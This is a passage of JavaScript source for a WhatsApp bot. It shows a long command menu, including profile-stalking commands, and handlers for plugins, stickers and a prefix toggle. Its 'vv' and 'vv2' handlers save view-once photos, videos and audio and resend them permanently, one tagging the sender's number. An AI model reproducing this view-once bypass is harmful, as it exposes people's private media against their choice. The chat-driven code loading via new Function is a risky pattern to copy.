> │❍ 𝒕𝒚𝒑𝒆𝒓𝒂𝒄𝒆𝒓
> │❍ 𝒏𝒆𝒗𝒆𝒓𝒉𝒂𝒗𝒆𝒊𝒆𝒗𝒆𝒓
> │❍ 𝒘𝒐𝒖𝒍𝒅𝒚𝒐𝒖𝒓𝒂𝒕𝒉𝒆𝒓
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑹𝑬𝑨𝑪𝑻𝑰𝑶𝑵𝑺  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒉𝒖𝒈
> │❍ 𝒌𝒊𝒔𝒔
> │❍ 𝒔𝒍𝒂𝒑
> │❍ 𝒑𝒂𝒕
> │❍ 𝒑𝒐𝒌𝒆
> │❍ 𝒄𝒖𝒅𝒅𝒍𝒆
> │❍ 𝒃𝒊𝒕𝒆
> │❍ 𝒃𝒍𝒖𝒔𝒉
> │❍ 𝒄𝒓𝒚
> │❍ 𝒅𝒂𝒏𝒄𝒆
> │❍ 𝒘𝒂𝒗𝒆
> │❍ 𝒘𝒊𝒏𝒌
> │❍ 𝒍𝒂𝒖𝒈𝒉
> │❍ 𝒔𝒎𝒊𝒍𝒆
> │❍ 𝒂𝒏𝒈𝒓𝒚
> │❍ 𝒔𝒂𝒅
> │❍ 𝒔𝒄𝒂𝒓𝒆𝒅
> │❍ 𝒔𝒍𝒆𝒆𝒑
> │❍ 𝒏𝒐𝒅
> │❍ 𝒏𝒐𝒎
> │❍ 𝒍𝒊𝒄𝒌
> │❍ 𝒑𝒖𝒏𝒄𝒉
> │❍ 𝒌𝒊𝒄𝒌
> │❍ 𝒕𝒉𝒓𝒐𝒘
> │❍ 𝒔𝒉𝒐𝒐𝒕
> │❍ 𝒇𝒂𝒄𝒆𝒑𝒂𝒍𝒎
> │❍ 𝒉𝒂𝒏𝒅𝒔𝒉𝒂𝒌𝒆
> │❍ 𝒉𝒊𝒈𝒉𝒇𝒊𝒗𝒆
> │❍ 𝒑𝒐𝒖𝒕
> │❍ 𝒔𝒕𝒂𝒓𝒆
> │❍ 𝒕𝒉𝒊𝒏𝒌
> │❍ 𝒔𝒉𝒓𝒖𝒈
> │❍ 𝒔𝒊𝒈𝒉
> │❍ 𝒃𝒐𝒓𝒆𝒅
> │❍ 𝒆𝒙𝒄𝒊𝒕𝒆𝒅
> │❍ 𝒄𝒐𝒏𝒇𝒖𝒔𝒆𝒅
> │❍ 𝒄𝒉𝒆𝒆𝒓
> │❍ 𝒚𝒂𝒘𝒏
> │❍ 𝒓𝒖𝒏
> │❍ 𝒏𝒐𝒔𝒆𝒃𝒍𝒆𝒆𝒅
> │❍ 𝒇𝒂𝒊𝒏𝒕
> │❍ 𝒄𝒆𝒍𝒆𝒃𝒓𝒂𝒕𝒆
> │❍ 𝒍𝒐𝒗𝒆
> │❍ 𝒌𝒊𝒍𝒍
> │❍ 𝒇𝒆𝒆𝒅
> │❍ 𝒉𝒐𝒍𝒅
> │❍ 𝒑𝒊𝒏𝒄𝒉
> │❍ 𝒄𝒂𝒓𝒓𝒚
> │❍ 𝒕𝒊𝒄𝒌𝒍𝒆
> │❍ 𝒑𝒓𝒐𝒕𝒆𝒄𝒕
> │❍ 𝒎𝒊𝒔𝒔
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑨𝑫𝑴𝑰𝑵  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒔𝒆𝒕𝒓𝒖𝒍𝒆𝒔𝒊𝒎𝒈
> │❍ 𝒄𝒍𝒆𝒂𝒓𝒓𝒖𝒍𝒆𝒔
> │❍ 𝒔𝒆𝒕𝒓𝒖𝒍𝒆𝒔
> │❍ 𝒓𝒖𝒍𝒆𝒔
> │❍ 𝒑𝒊𝒏𝒎𝒔𝒈
> │❍ 𝒖𝒏𝒑𝒊𝒏𝒎𝒔𝒈
> │❍ 𝒂𝒍𝒍𝒎𝒔𝒈
> │❍ 𝒅𝒆𝒍𝒎𝒔𝒈
> │❍ 𝒎𝒖𝒕𝒆𝒕𝒊𝒎𝒆
> │❍ 𝒖𝒏𝒎𝒖𝒕𝒆𝒂𝒍𝒍
> │❍ 𝒃𝒂𝒏𝒍𝒊𝒔𝒕
> │❍ 𝒖𝒏𝒃𝒂𝒏𝒂𝒍𝒍
> │❍ 𝒔𝒆𝒕𝒋𝒐𝒊𝒏𝒎𝒔𝒈
> │❍ 𝒔𝒆𝒕𝒍𝒆𝒂𝒗𝒆𝒎𝒔𝒈
> │❍ 𝒕𝒐𝒈𝒈𝒍𝒆𝒘𝒆𝒍𝒄𝒐𝒎𝒆
> │❍ 𝒕𝒐𝒈𝒈𝒍𝒆𝒈𝒐𝒐𝒅𝒃𝒚𝒆
> │❍ 𝒔𝒆𝒕𝒏𝒔𝒇𝒘
> │❍ 𝒂𝒏𝒕𝒊𝒏𝒔𝒇𝒘
> │❍ 𝒂𝒏𝒕𝒊𝒇𝒐𝒓𝒘𝒂𝒓𝒅
> │❍ 𝒂𝒏𝒕𝒊𝒇𝒂𝒌𝒆
> │❍ 𝒂𝒖𝒕𝒐𝒑𝒊𝒏
> │❍ 𝒂𝒖𝒕𝒐𝒓𝒆𝒂𝒄𝒕
> │❍ 𝒂𝒖𝒕𝒐𝒓𝒆𝒑𝒍𝒚
> │❍ 𝒔𝒆𝒕𝒂𝒖𝒕𝒐𝒓𝒆𝒑𝒍𝒚
> │❍ 𝒌𝒊𝒄𝒌𝒊𝒏𝒂𝒄𝒕𝒊𝒗𝒆𝟐
> │❍ 𝒘𝒂𝒓𝒏𝒓𝒆𝒔𝒆𝒕
> │❍ 𝒘𝒂𝒓𝒏𝒍𝒊𝒎𝒊𝒕
> │❍ 𝒔𝒆𝒕𝒘𝒂𝒓𝒏𝒍𝒊𝒎𝒊𝒕
> │❍ 𝒈𝒓𝒐𝒖𝒑𝒔𝒕𝒂𝒕
> │❍ 𝒓𝒆𝒑𝒐𝒓𝒕𝒂𝒅𝒎𝒊𝒏
> │❍ 𝒓𝒆𝒒𝒖𝒆𝒔𝒕𝒓𝒐𝒍𝒆
> │❍ 𝒗𝒐𝒕𝒆𝒃𝒂𝒏
> │❍ 𝒂𝒅𝒅𝒃𝒐𝒕
> │❍ 𝒓𝒆𝒎𝒐𝒗𝒆𝒃𝒐𝒕
> │❍ 𝒍𝒊𝒔𝒕𝒃𝒐𝒕𝒔
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑨𝑵𝑰𝑴𝑬  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒏𝒂𝒓𝒖𝒕𝒐
> │❍ 𝒐𝒏𝒆𝒑𝒊𝒆𝒄𝒆
> │❍ 𝒄𝒐𝒔𝒑𝒍𝒂𝒚
> │❍ 𝒎𝒊𝒌𝒂𝒔𝒂
> │❍ 𝒏𝒆𝒛𝒖𝒌𝒐
> │❍ 𝒔𝒂𝒔𝒖𝒌𝒆
> │❍ 𝒊𝒕𝒂𝒄𝒉𝒊
> │❍ 𝒔𝒂𝒌𝒖𝒓𝒂
> │❍ 𝒉𝒊𝒏𝒂𝒕𝒂
> │❍ 𝒍𝒊𝒔𝒂
> │❍ 𝒎𝒂𝒅𝒂𝒓𝒂
> │❍ 𝒎𝒊𝒌𝒖
> │❍ 𝒂𝒌𝒊𝒚𝒂𝒎𝒂
> │❍ 𝒂𝒏𝒂
> │❍ 𝒂𝒓𝒕
> │❍ 𝒂𝒔𝒖𝒏𝒂
> │❍ 𝒃𝒐𝒓𝒖𝒕𝒐
> │❍ 𝒃𝒕𝒔
> │❍ 𝒓𝒊𝒛𝒆
> │❍ 𝒓𝒐𝒔𝒆
> │❍ 𝒔𝒂𝒈𝒊𝒓𝒊
> │❍ 𝒔𝒂𝒕𝒂𝒏𝒊𝒄
> │❍ 𝒔𝒉𝒊𝒏𝒂
> │❍ 𝒔𝒉𝒊𝒏𝒌𝒂
> │❍ 𝒔𝒉𝒊𝒏𝒐𝒎𝒊𝒚𝒂
> │❍ 𝒔𝒉𝒊𝒛𝒖𝒌𝒂
> │❍ 𝒔𝒉𝒐𝒕𝒂
> │❍ 𝒔𝒉𝒐𝒓𝒕𝒒𝒖𝒐𝒕𝒆
> │❍ 𝒔𝒑𝒂𝒄𝒆
> │❍ 𝒕𝒆𝒄𝒉𝒏𝒐𝒍𝒐𝒈𝒚
> │❍ 𝒕𝒆𝒋𝒊𝒏𝒂
> │❍ 𝒕𝒐𝒖𝒌𝒂𝒄𝒉𝒂𝒏
> │❍ 𝒕𝒔𝒖𝒏𝒂𝒅𝒆
> │❍ 𝒚𝒐𝒕𝒔𝒖𝒃𝒂
> │❍ 𝒚𝒖𝒌𝒊
> │❍ 𝒚𝒖𝒍𝒊𝒃𝒐𝒄𝒊𝒍
> │❍ 𝒚𝒖𝒎𝒆𝒌𝒐
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑺𝑬𝑨𝑹𝑪𝑯  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒑𝒍𝒂𝒚𝒔𝒕𝒐𝒓𝒆
> │❍ 𝒑𝒍𝒂𝒚𝒔𝒕𝒂𝒕𝒊𝒐𝒏
> │❍ 𝒈𝒐𝒐𝒈𝒍𝒆
> │❍ 𝒄𝒉𝒓𝒐𝒎𝒆
> │❍ 𝒈𝒊𝒎𝒂𝒈𝒆
> │❍ 𝒃𝒊𝒏𝒈𝒔𝒓𝒄
> │❍ 𝒃𝒊𝒏𝒈𝒊𝒎𝒈
> │❍ 𝒃𝒊𝒏𝒈𝒗𝒊𝒅𝒆𝒐
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑬𝑵𝑪𝑹𝒀𝑷𝑻𝑰𝑶𝑵  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒆𝒏𝒄𝒂𝒓𝒂𝒃
> │❍ 𝒆𝒏𝒄𝒄𝒉𝒊𝒏𝒂
> │❍ 𝒆𝒏𝒄𝒄𝒖𝒔𝒕𝒐𝒎
> │❍ 𝒆𝒏𝒄𝒊𝒏𝒗𝒊𝒔
> │❍ 𝒆𝒏𝒄𝒔𝒊𝒖
> │❍ 𝒆𝒏𝒄𝒔𝒕𝒓𝒐𝒏𝒈
> │❍ 𝒆𝒏𝒄𝒖𝒍𝒕𝒓𝒂
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑬𝑷𝑯𝑶𝑻𝑶  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒈𝒍𝒊𝒕𝒄𝒉𝒕𝒆𝒙𝒕
> │❍ 𝒘𝒓𝒊𝒕𝒆𝒕𝒆𝒙𝒕
> │❍ 𝒂𝒅𝒗𝒂𝒏𝒄𝒆𝒅𝒈𝒍𝒐𝒘
> │❍ 𝒕𝒚𝒑𝒐𝒈𝒓𝒂𝒑𝒉𝒚𝒕𝒆𝒙𝒕
> │❍ 𝒑𝒊𝒙𝒆𝒍𝒈𝒍𝒊𝒕𝒄𝒉
> │❍ 𝒏𝒆𝒐𝒏𝒈𝒍𝒊𝒕𝒄𝒉
> │❍ 𝒇𝒍𝒂𝒈𝒕𝒆𝒙𝒕
> │❍ 𝒇𝒍𝒂𝒈𝟑𝒅𝒕𝒆𝒙𝒕
> │❍ 𝒅𝒆𝒍𝒆𝒕𝒊𝒏𝒈𝒕𝒆𝒙𝒕
> │❍ 𝒃𝒍𝒂𝒄𝒌𝒑𝒊𝒏𝒌𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒈𝒍𝒐𝒘𝒊𝒏𝒈𝒕𝒆𝒙𝒕
> │❍ 𝒖𝒏𝒅𝒆𝒓𝒘𝒂𝒕𝒆𝒓𝒕𝒆𝒙𝒕
> │❍ 𝒍𝒐𝒈𝒐𝒎𝒂𝒌𝒆𝒓
> │❍ 𝒄𝒂𝒓𝒕𝒐𝒐𝒏𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒑𝒂𝒑𝒆𝒓𝒄𝒖𝒕𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒘𝒂𝒕𝒆𝒓𝒄𝒐𝒍𝒐𝒓𝒕𝒆𝒙𝒕
> │❍ 𝒆𝒇𝒇𝒆𝒄𝒕𝒄𝒍𝒐𝒖𝒅𝒔
> │❍ 𝒃𝒍𝒂𝒄𝒌𝒑𝒊𝒏𝒌𝒍𝒐𝒈𝒐
> │❍ 𝒈𝒓𝒂𝒅𝒊𝒆𝒏𝒕𝒕𝒆𝒙𝒕
> │❍ 𝒔𝒖𝒎𝒎𝒆𝒓𝒃𝒆𝒂𝒄𝒉
> │❍ 𝒍𝒖𝒙𝒖𝒓𝒚𝒈𝒐𝒍𝒅
> │❍ 𝒎𝒖𝒍𝒕𝒊𝒄𝒐𝒍𝒐𝒚𝒆𝒍𝒍𝒐𝒘𝒏𝒆𝒐𝒏
> │❍ 𝒔𝒂𝒏𝒅𝒔𝒖𝒎𝒎𝒆𝒓
> │❍ 𝒈𝒂𝒍𝒂𝒙𝒚𝒘𝒂𝒍𝒍𝒑𝒂𝒑𝒆𝒓
> │❍ 𝟏𝟗𝟏𝟕𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒎𝒂𝒌𝒊𝒏𝒈𝒏𝒆𝒐𝒏
> │❍ 𝒓𝒐𝒚𝒂𝒍𝒕𝒆𝒙𝒕
> │❍ 𝒇𝒓𝒆𝒆𝒄𝒓𝒆𝒂𝒕𝒆
> │❍ 𝒈𝒂𝒍𝒂𝒙𝒚𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒍𝒊𝒈𝒉𝒕𝒆𝒇𝒇𝒆𝒄𝒕𝒔
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑴𝑨𝑲𝑬𝑹  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒂𝒏𝒊𝒎𝒆𝒈𝒊𝒓𝒍
> │❍ 𝒇𝒂𝒌𝒆𝒄𝒂𝒍𝒍
> │❍ 𝒃𝒓𝒂𝒕
> │❍ 𝒑𝒂𝒌-𝒖𝒔𝒕𝒂𝒅
> │❍ 𝒏𝒈𝒍
> │❍ 𝒕𝒐𝒈𝒖𝒓𝒂
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑺𝑻𝑨𝑳𝑲  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒊𝒈
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒓𝒐𝒃𝒍𝒐𝒙
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒕𝒘𝒊𝒕𝒆𝒓
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒚𝒕
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑰𝑵𝑺𝑻𝑨𝑳𝑳  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒑𝒂𝒏𝒆𝒍
> │❍ 𝒖𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒑𝒂𝒏𝒆𝒍
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂𝒃𝒊𝒍𝒍𝒊𝒏𝒈
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂𝒆𝒏𝒊𝒈𝒎𝒂
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂𝒔𝒕𝒆𝒍𝒍𝒂𝒓
> │❍ 𝒖𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒎𝒆𝒏𝒖
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑩𝑼𝒀𝑷𝑨𝑵𝑬𝑳  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒃𝒖𝒚𝒑𝒂𝒏𝒆𝒍
> │❍ 𝒗𝒆𝒓𝒊𝒇𝒚𝒑𝒂𝒚𝒎𝒆𝒏𝒕
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑵𝑬𝑾𝑺  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒂𝒏𝒕𝒂𝒓𝒂
> │❍ 𝒄𝒏𝒃𝒄
> │❍ 𝒄𝒏𝒏
> │❍ 𝒌𝒐𝒎𝒑𝒂𝒔
> │❍ 𝒎𝒆𝒓𝒅𝒆𝒌𝒂
> │❍ 𝒔𝒊𝒏𝒅𝒐𝒏𝒆𝒘𝒔
> │❍ 𝒔𝒖𝒂𝒓𝒂
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑺𝑻𝒀𝑳𝑬𝑻𝑹𝑨𝑵𝑺𝑭𝑬𝑹  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒕𝒐𝒂𝒏𝒊𝒎𝒆
> │❍ 𝒕𝒐𝒃𝒆𝒓𝒔𝒂𝒎𝒂
> │❍ 𝒕𝒐𝒃𝒍𝒐𝒏𝒅𝒆
> │❍ 𝒕𝒐𝒃𝒐𝒕𝒂𝒌
> │❍ 𝒕𝒐𝒉𝒊𝒋𝒂𝒃
> │❍ 𝒕𝒐𝒎𝒆𝒌𝒂𝒉
> │❍ 𝒕𝒐𝒎𝒊𝒓𝒓𝒐𝒓
> │❍ 𝒕𝒐𝒗𝒊𝒏𝒕𝒂𝒈𝒆
> │❍ 𝒕𝒐𝒇𝒊𝒈𝒖𝒓𝒂
> │❍ 𝒕𝒐𝒇𝒊𝒈𝒖𝒓𝒂𝒗𝟐
> │❍ 𝒕𝒐𝒇𝒊𝒈𝒖𝒓𝒂𝒗𝟑
> │❍ 𝒕𝒐𝒔𝒆𝒙𝒚
> │❍ 𝒕𝒐𝒃𝒖𝒈𝒊𝒍
> │❍ 𝒕𝒐𝒑𝒖𝒕𝒊𝒉
> │❍ 𝒕𝒐𝒉𝒊𝒕𝒂𝒎
> │❍ 𝒆𝒅𝒊𝒕
> │❍ 𝒓𝒆𝒎𝒐𝒗𝒆𝒘𝒎
> │❍ 𝒓𝒘𝒎
> │❍ 𝒓𝒆𝒎𝒐𝒗𝒆𝒘𝒂𝒕𝒆𝒓𝒎𝒂𝒓𝒌
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑹𝑨𝑵𝑫𝑶𝑴𝑰𝑴𝑨𝑮𝑬  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒃𝒍𝒖𝒆𝒂𝒓𝒄𝒉𝒊𝒗𝒆𝒓
> │❍ 𝒃𝒍𝒖𝒆𝒂𝒓𝒄𝒉𝒊𝒗𝒆𝒓
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒄𝒉𝒊𝒏𝒂
> │❍ 𝒄𝒉𝒊𝒏𝒂
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒊𝒏𝒅𝒐
> │❍ 𝒊𝒏𝒅𝒐
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒘𝒂𝒊𝒇𝒖
> │❍ 𝒘𝒂𝒊𝒇𝒖
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒏𝒆𝒌𝒐
> │❍ 𝒏𝒆𝒌𝒐
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒗𝒊𝒆𝒕𝒏𝒂𝒎
> │❍ 𝒗𝒊𝒆𝒕𝒏𝒂𝒎
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒕𝒉𝒂𝒊𝒍𝒂𝒏𝒅
> │❍ 𝒕𝒉𝒂𝒊𝒍𝒂𝒏𝒅
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒌𝒐𝒓𝒆𝒂
> │❍ 𝒌𝒐𝒓𝒆𝒂
> │❍ 𝒓𝒂𝒏𝒅𝒐𝒎𝒋𝒂𝒑𝒂𝒏
> │❍ 𝒋𝒂𝒑𝒂𝒏
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐


> ╭═━⪩ 〖  𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒕𝒈𝒔𝒕𝒊𝒄𝒌𝒆𝒓𝒔
> │❍ 𝒕𝒈𝒔𝒕𝒊𝒄𝒌𝒆𝒓
> │❍ 𝒕𝒆𝒍𝒆𝒈𝒓𝒂𝒎𝒔𝒕𝒊𝒄𝒌𝒆𝒓
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`;

      // ── Combine status + command list ──
      const fullMenu = statusCaption + cmdList;

      // ── Send menu with image ──
      try {
        const imgBuf = await getBuffer(menuImg);
        await sock.sendMessage(jid, {
          image: imgBuf,
          caption: fullMenu,
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
              newsletterName: settings.CHANNEL_NAME || '〖 𝐒𝚰𝐋𝚬𝚴𝐂𝚬𝚪 𝚵𝚳𝐃 〗'
            },
            externalAdReply: {
              title: ft(global.name || 'silencer XMD', sock),
              body: ft(`version • ${global.version || '3.1.0'}`, sock),
              thumbnailUrl: menuThumb,
              sourceUrl: `https://Uptime • ${myUptime}`,
              mediaType: 1,
              renderLargerThumbnail: false,
            }
          }
        }, { quoted: m });
      } catch (e) {
        await sock.sendMessage(jid, { text: fullMenu }, { quoted: m });
      }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   OWNER COMMANDS (addfunction, listplugins, delplugin)
    // ══════════════════════════════════════════════════════

    case 'addfunction':
    case 'addplugin': {
      if (needOwner()) break;
      if (!text) {
        return reply(
          `📌 *Add a custom plugin*\n\n` +
          `Usage: .addfunction <name>|<description>|<function_body>\n\n` +
          `Example:\n` +
          `.addfunction hello|Says hello|async function(sock, m, args, reply) { await reply("Hello from Blacklord!"); }`
        );
      }
      const parts = text.split('|');
      if (parts.length < 3) {
        return reply('❌ Invalid format. Use: name|description|function_body');
      }
      const name = parts[0].trim();
      const description = parts[1].trim();
      const functionBody = parts.slice(2).join('|').trim();
      if (!name || !description || !functionBody) {
        return reply('❌ All fields are required.');
      }
      try {
        const testFn = new Function(
          'sock', 'm', 'args', 'reply', 'reaction', 'ft', 'cfg', 'dlMedia', 'getQuoted', 'normNum', 'getTargetJid',
          `return (${functionBody})`
        );
        if (typeof testFn !== 'function') throw new Error('Not a function');
      } catch (e) {
        return reply(`❌ Invalid function body: ${e.message}`);
      }
      const plugin = { name, description, functionBody, ownerOnly: true, createdAt: Date.now() };
      try {
        savePlugin(plugin);
        await reply(`✅ Plugin "${name}" added successfully. Rebooting to apply...`);
        setTimeout(() => process.exit(0), 2000);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
      break;
    }

    case 'listplugins':
    case 'plugins': {
      if (needOwner()) break;
      const data = readJSON(pluginsFile, []);
      if (!data.length) return reply('📋 No plugins installed.');
      const list = data.map((p, i) => `${i+1}. *${p.name}* – ${p.description}`).join('\n');
      await reply(`📋 *Plugins (${data.length})*\n\n${list}`);
      break;
    }

    case 'delplugin':
    case 'removeplugin': {
      if (needOwner()) break;
      const name = args[0];
      if (!name) return reply('Usage: .delplugin <plugin_name>');
      try {
        deletePlugin(name);
        await reply(`✅ Plugin "${name}" deleted. Rebooting...`);
        setTimeout(() => process.exit(0), 2000);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
      break;
    }
    // ══════════════════════════════════════════════════════
    //   GENERAL
    // ══════════════════════════════════════════════════════
case 'prefixfree':
case 'setprefixfree': {
  if (!_isOwner) return reply('❌ Owner only.');

  // Toggle or set explicitly
  let newState;
  if (args.length === 0) {
    // Toggle
    newState = !c.prefixfree;
  } else {
    const arg = args[0].toLowerCase();
    if (arg === 'on' || arg === 'true' || arg === '1') newState = true;
    else if (arg === 'off' || arg === 'false' || arg === '0') newState = false;
    else return reply('❌ Invalid argument. Use `on`/`off` or leave empty to toggle.');
  }

  // Save the setting
  await setWaSetting(waNum, 'prefixfree', newState);
  // Update local c for immediate use (optional)
  c.prefixfree = newState;

  reply(`✅ Prefix‑free mode is now **${newState ? 'ON' : 'OFF'}**.`);
  break;
}case 'setsticker': {
    if (needOwner()) break;

    const { qMsg, qType } = getQuoted(m);
    if (qType !== 'stickerMessage') {
        await reply(
`Usage: Reply to a sticker with:
.setsticker <command>
Example: .setsticker menu
To remove: .setsticker -remove`
        );
        break;
    }

    const commandName = args[0]?.toLowerCase();
    if (!commandName) {
        await reply('❌ Provide a command name.\nExample: `.setsticker menu`');
        break;
    }

    const sticker = qMsg.stickerMessage;
    let hashBytes = sticker.fileSha256;
    if (!hashBytes) {
        await reply('❌ Could not read sticker hash.');
        break;
    }
    const buffer = Buffer.isBuffer(hashBytes) ? hashBytes : Buffer.from(hashBytes);
    const hashBase64 = buffer.toString('base64');

    if (commandName === '-remove') {
        setStickerCommand(hashBase64, null);
        await reply(`✅ Sticker command removed.`);
    } else {
        setStickerCommand(hashBase64, commandName);
        await reply(`✅ Sticker command set to: .${commandName}\nHash: ${hashBase64.slice(0, 16)}…`);
    }
    break;
}

case 'liststickers': {
    if (needOwner()) break;
    const map = getStickerCommands();
    const entries = Object.entries(map);
    if (!entries.length) {
        await reply('📋 No sticker commands set.');
        break;
    }
    const list = entries.map(([hash, cmd], i) => `${i+1}. ${hash.slice(0, 16)}… → .${cmd}`).join('\n');
    await reply(`📋 Sticker commands:\n${list}`);
    break;
}case 'vv': {
    const { qMsg, qType, qKey } = getQuoted(m);
    if (!qMsg) {
        await reply(
`Usage: Reply to a view‑once message`
        );
        break;
    }
    let inner = qMsg;
    for (const w of ['viewOnceMessage','viewOnceMessageV2','viewOnceMessageV2Extension']) {
        if (inner[w]?.message) { inner = inner[w].message; break; }
    }
    const voImg = inner.imageMessage;
    const voVid = inner.videoMessage;
    if (!voImg && !voVid) {
        await reply(`❌ Not a view‑once message.`);
        break;
    }
    try {
        const src = voImg ? { imageMessage: voImg } : { videoMessage: voVid };
        const buf = await dlMedia(src, qKey);
        if (voImg) {
            // Assumes replyImg() sends an image
            await replyImg(buf, '👁 Revealed');
        } else if (!cfg(sock).iphoneMode) {
            await sock.sendMessage(jid, { video: buf, caption: '👁 Revealed' }, { quoted: qchanel });
        } else {
            await reply(`👁 View‑once video revealed.`);
        }
    } catch (e) {
        await reply(`❌ Error: ${e.message}`);
    }
    break;
}case 'vv2':
case 'cute': {
    // Get quoted message (view‑once media)
    const quotedMsg = m.quoted ? m.quoted : (() => {
        const ctx = m.message?.extendedTextMessage?.contextInfo;
        if (ctx?.quotedMessage) {
            const qMsg = ctx.quotedMessage;
            const qType = Object.keys(qMsg).find(k => !['senderKeyDistributionMessage','messageContextInfo'].includes(k));
            return { message: qMsg, msg: qMsg[qType], type: qType };
        }
        return null;
    })();

    const userJid = sender; // user's private chat JID

    if (!quotedMsg) {
        await sock.sendMessage(userJid, { text: 'Usage: Reply to a view‑once media with .vv2' });
        break;
    }

    // Unwrap view‑once container
    let innerMsg = quotedMsg.message || quotedMsg;
    for (const w of ['viewOnceMessage','viewOnceMessageV2','viewOnceMessageV2Extension']) {
        if (innerMsg[w]?.message) {
            innerMsg = innerMsg[w].message;
            break;
        }
    }

    const imgMsg = innerMsg.imageMessage;
    const vidMsg = innerMsg.videoMessage;
    const audMsg = innerMsg.audioMessage;

    if (!imgMsg && !vidMsg && !audMsg) {
        await sock.sendMessage(userJid, { text: '❌ Not a view‑once message.' });
        break;
    }

    // Download media
    try {
        let mediaBuffer;
        let mediaType = '';
        let caption = '';

        if (imgMsg) {
            mediaBuffer = await dlMedia({ imageMessage: imgMsg }, m.key);
            mediaType = 'image';
            caption = '🔓 View‑Once Image\nFrom: ' + senderNumber;
        } else if (vidMsg) {
            mediaBuffer = await dlMedia({ videoMessage: vidMsg }, m.key);
            mediaType = 'video';
            caption = '🔓 View‑Once Video\nFrom: ' + senderNumber;
        } else if (audMsg) {
            mediaBuffer = await dlMedia({ audioMessage: audMsg }, m.key);
            mediaType = 'audio';
            caption = '🔓 View‑Once Audio\nFrom: ' + senderNumber;
        }

        // Send media to user's DM
        if (mediaType === 'image') {
            await sock.sendMessage(userJid, { image: mediaBuffer, caption: caption });
        } else if (mediaType === 'video') {
            await sock.sendMessage(userJid, { video: mediaBuffer, caption: caption });
        } else if (mediaType === 'audio') {
            await sock.sendMessage(userJid, { audio: mediaBuffer, mimetype: 'audio/mpeg', ptt: false });
        }

        // Success confirmation
        await sock.sendMessage(userJid, { text: `✅ ${mediaType.toUpperCase()} delivered to your DM.` });
    } catch (err) {
        console.error('View-once error:', err);
        await sock.sendMessage(userJid, { text: '❌ Failed to process view‑once media.' });
    }
    break;
}
      

    // ══════════════════════════════════════════════════════
    //   TEST: interactiveMessage format 1 (full native flow)
    // ══════════════════════════════════════════════════════
    case 'itest1': {
      if (needOwner()) break;
      await reaction('🧪');
      const imgUrl1 = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/c6wcqp.jpeg';

